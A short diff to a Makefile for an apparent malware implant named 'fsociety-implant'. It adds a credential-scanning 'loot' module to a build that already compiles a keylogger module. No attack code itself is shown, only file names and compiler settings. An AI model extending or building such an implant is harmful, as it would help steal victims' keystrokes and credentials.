@@ -2,7 +2,8 @@ CC     = gcc
 CFLAGS = -Wall -Wextra -O2 -Iinclude
 
 SRCS   = src/main.c \
-         src/modules/keylog/keylog.c
+         src/modules/keylog/keylog.c \
+         src/modules/loot/credscan.c
 
 TARGET = fsociety-implant
 
